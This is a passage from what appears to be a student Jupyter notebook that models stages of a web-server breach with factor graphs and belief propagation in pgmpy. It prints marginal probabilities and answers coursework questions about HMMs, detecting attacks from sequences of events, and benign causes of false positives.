      "Eliminating: E4: 100%|███████████████████████████████████████████████████████████████████| 5/5 [00:01<00:00,  4.86it/s]\n",
      "Eliminating: E2: 100%|██████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 242.99it/s]\n",
      "Eliminating: E8: 100%|██████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 250.87it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+--------+-----------+\n",
      "| S1     |   phi(S1) |\n",
      "+========+===========+\n",
      "| S1(0)  |    0.9360 |\n",
      "+--------+-----------+\n",
      "| S1(1)  |    0.0640 |\n",
      "+--------+-----------+\n",
      "| S1(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "+--------+-----------+\n",
      "| S2     |   phi(S2) |\n",
      "+========+===========+\n",
      "| S2(0)  |    1.0000 |\n",
      "+--------+-----------+\n",
      "| S2(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "+--------+-----------+\n",
      "| S8     |   phi(S8) |\n",
      "+========+===========+\n",
      "| S8(0)  |    0.0200 |\n",
      "+--------+-----------+\n",
      "| S8(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(8)  |    0.9800 |\n",
      "+--------+-----------+\n",
      "| S8(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(10) |    0.0000 |\n",
      "+--------+-----------+\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n",
      "Eliminating: E9: 100%|██████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 232.37it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+--------+-----------+\n",
      "| S9     |   phi(S9) |\n",
      "+========+===========+\n",
      "| S9(0)  |    0.0200 |\n",
      "+--------+-----------+\n",
      "| S9(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(8)  |    0.9800 |\n",
      "+--------+-----------+\n",
      "| S9(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(10) |    0.0000 |\n",
      "+--------+-----------+\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "f_1 = DiscreteFactor(variables=['S1','E1'],cardinality=[11,1],values=np.array(df_factor['f1']))\n",
    "f_2 = DiscreteFactor(variables=['S2','E2'],cardinality=[11,1],values=np.array(df_factor['f2']))\n",
    "f_3 = DiscreteFactor(variables=['S3','E3'],cardinality=[11,1],values=np.array(df_factor['f3']))\n",
    "f_4 = DiscreteFactor(variables=['S4','E4'],cardinality=[11,1],values=np.array(df_factor['f4']))\n",
    "f_5 = DiscreteFactor(variables=['S5','E5'],cardinality=[11,1],values=np.array(df_factor['f5']))\n",
    "f_6 = DiscreteFactor(variables=['S6','E6'],cardinality=[11,1],values=np.array(df_factor['f6']))\n",
    "f_7 = DiscreteFactor(variables=['S7','E7'],cardinality=[11,1],values=np.array(df_factor['f7']))\n",
    "f_8 = DiscreteFactor(variables=['S8','E8'],cardinality=[11,1],values=np.array(df_factor['f8']))\n",
    "f_9 = DiscreteFactor(variables=['S9','E9'],cardinality=[11,1],values=np.array(df_factor['f9']))\n",
    "\n",
    "c= DiscreteFactor(variables=['S6','E1','E3','E6'],cardinality=[11,1,1,1],values=[0,0,0,0,0,0.0714,0,0,0,0,0])\n",
    "r= DiscreteFactor(variables=['S5','E3','E4','E5'],cardinality=[11,1,1,1],values=[0,0,0,0,0.0664,0,0,0,0,0,0])\n",
    "\n",
    "G1 = FactorGraph() ## Create FactorGraph object\n",
    "G1.add_nodes_from(['E1','E3','E4','E5','E6','S1','S3','S4','S5','S6'])  ## Add random variables \n",
    "G1.add_factors(f_1,f_3,f_4,f_5,f_6,r,c)    ## Add factor functions\n",
    "\n",
    "\n",
    "G1.add_edges_from([('S1',f_1),('E1',f_1),('S3',f_3),('E3',f_3),('S6',f_6),('E6',f_6)\n",
    "                   ,('S4',f_4),('E4',f_4),('S5',f_5),('E5',f_5),('E1',c),('E3',c),('E6',c),('S6',c),\n",
    "                    ('E3',r),('E4',r),('E5',r),('S5',r)])\n",
    "\n",
    "\n",
    "bp1 = BeliefPropagation(G1)\n",
    "margin1=bp1.query(variables=['S1','S3','S4','S5','S6'],joint=False)\n",
    "print(margin1['S1'])\n",
    "\n",
    "G2 = FactorGraph() ## Create FactorGraph object\n",
    "G2.add_nodes_from(['S2','E2'])  ## Add random variables \n",
    "G2.add_factors(f_2)     ## Add factor functions\n",
    "G2.add_edges_from([('S2',f_2),('E2',f_2)])\n",
    "\n",
    "bp2 = BeliefPropagation(G2)\n",
    "margin2=bp2.query(variables=['S2'],joint=False)\n",
    "print(margin2['S2'])\n",
    "\n",
    "\n",
    "G4 = FactorGraph() ## Create FactorGraph object\n",
    "G4.add_nodes_from(['S8','E8'])  ## Add random variables \n",
    "G4.add_factors(f_8)     ## Add factor functions\n",
    "G4.add_edges_from([('S8',f_8),('E8',f_8)])\n",
    "\n",
    "bp = BeliefPropagation(G4)\n",
    "margin4=bp.query(variables=['S8'],joint=False)\n",
    "print(margin4['S8'])\n",
    "\n",
    "\n",
    "G5 = FactorGraph() ## Create FactorGraph object\n",
    "G5.add_nodes_from(['S9','E9'])  ## Add random variables \n",
    "G5.add_factors(f_9)     ## Add factor functions\n",
    "G5.add_edges_from([('S9',f_9),('E9',f_9)])\n",
    "\n",
    "bp = BeliefPropagation(G5)\n",
    "margin5=bp.query(variables=['S9'],joint=False)\n",
    "print(margin5['S9'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>The most probable states for s1-s6,s8,s9 remain the same because s7 and e7 are an independent entity disconnected from the other \n",
    "states and events. No message/beliefs are passed onto another nodes due to which their probabilities are independent of s7 and e7<b>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Subtask 3.8.b"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "b. The parameters needed for the HMM are the\n",
    "1) transition probability matrix (Chance of moving from one state to another)<br>\n",
    "2) Emission probabilities (Probability of an event happening)<br>\n",
    "3) Initial distribution of hidden states (Pi)<br>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Subtask 3.8.c"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<br>1) Factor graphs can take all the past states into consideration for finding the probability distribution of each states unlike HMM which assumes tha current state depends only on its immediate past state. In essence, it is a superset to HMMs<br>\n",
    "<br>2) Factor graphs can represent both casual and non casual relationships with undirected network"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Subtask 4.0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "It is not possible to detect the attack using only one event. For example, when we consider event e1, there can be any official user who can\n",
    "login to the current equifax website to look up some information. It is only by observing a sequence of past events, we can say that the server is 100% on attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Subtask 4.1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "For example,<br>\n",
    "\n",
    "1) Login - The system admin is logged into the server to check for some network issues and he is mistaken as an attacker<br>\n",
    "\n",
    "2) Sensitive URI - The company would have prompted for all the users to download .exe. for instance that would provide a set of data in the OS. This could be mistaken as an URI from a suspicious source like an attacker . https://www.computerhope.com/jargon/e/execfile.htm <br>\n",
    "\n",
    "3) New executable file -  <br>\n",
    "\n",
    "4) Home page overwritten with a new link - The server admin might want the users to access the domain quite easily and could have renamed it but it might have been misunderstood as being done by an attacker<br>\n",
    "\n",
    "5) Webserver restarted - A system admin is restarting the webserver after performing some modifications in the configuration. This might be misleading as the system might think that there is an attack in progress<br>\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "<b>Subtask 4.3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The variables that are common in both the factor graphs are Scan, Login and Sensitive URI. The factor function is that is common would \n",
    "the function r"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
